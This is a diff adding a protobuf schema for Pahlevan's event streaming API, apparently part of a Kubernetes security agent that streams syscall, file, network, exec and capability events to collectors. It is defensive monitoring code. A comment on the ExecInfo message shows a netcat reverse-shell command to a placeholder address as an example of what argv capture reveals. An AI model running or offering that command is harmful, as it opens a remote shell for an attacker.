@@ -1,0 +1,172 @@
+// Pahlevan's event streaming API.
+//
+// This is the integration surface. Until it existed, events reached a
+// JSON-lines file and an HTTP webhook and nothing else, so integrating meant
+// tailing a file on every node. A streaming API is what lets a collector,
+// a SIEM shipper, or `pahlevan events` subscribe to one agent and receive
+// events as they happen.
+//
+// The message shape deliberately mirrors the JSON envelope in pkg/export, so
+// the two representations of an event cannot drift into telling different
+// stories.
+syntax = "proto3";
+
+package pahlevan.v1alpha1;
+
+option go_package = "github.com/obsernetics/pahlevan/api/v1alpha1;apiv1alpha1";
+
+// EventService streams security events observed by one node's agent.
+service EventService {
+  // Subscribe streams events as they are observed. The stream stays open until
+  // the client goes away or the agent stops.
+  //
+  // A slow subscriber is dropped rather than allowed to stall the ring-buffer
+  // reader; the drop is counted and reported, never silent.
+  rpc Subscribe(SubscribeRequest) returns (stream Event);
+
+  // GetStatus reports what the agent is doing, so a client can tell "nothing
+  // is happening" apart from "nothing is wired up".
+  rpc GetStatus(StatusRequest) returns (StatusResponse);
+}
+
+message SubscribeRequest {
+  // Only these event kinds are sent. Empty means all of them.
+  repeated EventType types = 1;
+
+  // Only denials are sent. This is the common case for an alerting pipeline:
+  // observations are high volume and denials are what needs a human.
+  bool denials_only = 2;
+
+  // Only events for pods in this namespace are sent. Empty means all.
+  string namespace = 3;
+
+  // Only events for this pod are sent. Empty means all.
+  string pod = 4;
+}
+
+enum EventType {
+  EVENT_TYPE_UNSPECIFIED = 0;
+  EVENT_TYPE_SYSCALL = 1;
+  EVENT_TYPE_FILE = 2;
+  EVENT_TYPE_NETWORK = 3;
+  EVENT_TYPE_PROCESS = 4;
+  EVENT_TYPE_CAPABILITY = 5;
+}
+
+enum Action {
+  ACTION_UNSPECIFIED = 0;
+  // The operation was observed and allowed through.
+  ACTION_OBSERVE = 1;
+  // The operation was refused in-kernel with EPERM.
+  ACTION_DENY = 2;
+}
+
+message Event {
+  string version = 1;
+  EventType type = 2;
+  Action action = 3;
+  // Wall-clock time the agent saw the event, RFC 3339.
+  string timestamp = 4;
+  // Monotonic kernel timestamp, for ordering within a node.
+  uint64 kernel_time_ns = 5;
+  uint64 cgroup_id = 6;
+  string source = 7;
+
+  ProcessInfo process = 8;
+  KubernetesRef kubernetes = 9;
+
+  oneof detail {
+    SyscallInfo syscall = 10;
+    FileInfo file = 11;
+    NetworkInfo network = 12;
+    ExecInfo exec = 13;
+    CapabilityInfo capability = 14;
+  }
+}
+
+message ProcessInfo {
+  uint32 pid = 1;
+  uint32 tgid = 2;
+  uint32 uid = 3;
+  uint32 gid = 4;
+  string comm = 5;
+}
+
+message KubernetesRef {
+  string namespace = 1;
+  string pod = 2;
+  string container = 3;
+  string pod_uid = 4;
+  string container_id = 5;
+  string runtime = 6;
+  string qos_class = 7;
+  string node = 8;
+  string workload_kind = 9;
+  string workload_name = 10;
+  map<string, string> labels = 11;
+  string image = 12;
+}
+
+message SyscallInfo {
+  uint64 number = 1;
+  string name = 2;
+}
+
+message FileInfo {
+  string path = 1;
+  uint32 flags = 2;
+  uint32 mode = 3;
+  // True when the open requested write access. Reads and writes are separate
+  // allow-set entries, so this is part of the decision and not a detail.
+  bool write = 4;
+}
+
+message NetworkInfo {
+  string destination_ip = 1;
+  uint32 destination_port = 2;
+  string protocol = 3;
+  uint32 protocol_number = 4;
+  string direction = 5;
+  string address_family = 6;
+}
+
+message ExecInfo {
+  string binary = 1;
+  // argv as the caller passed it. This is what separates "nc ran" from
+  // "nc -e /bin/sh 10.0.0.1 4444".
+  repeated string args = 2;
+  string command_line = 3;
+  // The command line did not fit the kernel's capture buffer, so args is a
+  // prefix. A client must not read it as the whole invocation.
+  bool args_truncated = 4;
+  // Process lineage, nearest ancestor first.
+  repeated Ancestor ancestry = 5;
+  string ancestry_chain = 6;
+}
+
+message Ancestor {
+  uint32 pid = 1;
+  string comm = 2;
+}
+
+message CapabilityInfo {
+  uint32 number = 1;
+  string name = 2;
+}
+
+message StatusRequest {}
+
+message StatusResponse {
+  string node = 1;
+  // Containers the agent is tracking, and how many have reached enforcement.
+  // A fleet tracking containers and enforcing none of them is the quietest
+  // possible failure, so it is reported rather than inferred.
+  int32 containers_tracked = 2;
+  int32 containers_learning = 3;
+  int32 containers_enforcing = 4;
+  // Subscribers currently attached, and events dropped because a subscriber
+  // could not keep up. Dropped events are counted, never silent.
+  int32 subscribers = 5;
+  uint64 events_dropped = 6;
+  string version = 7;
+}
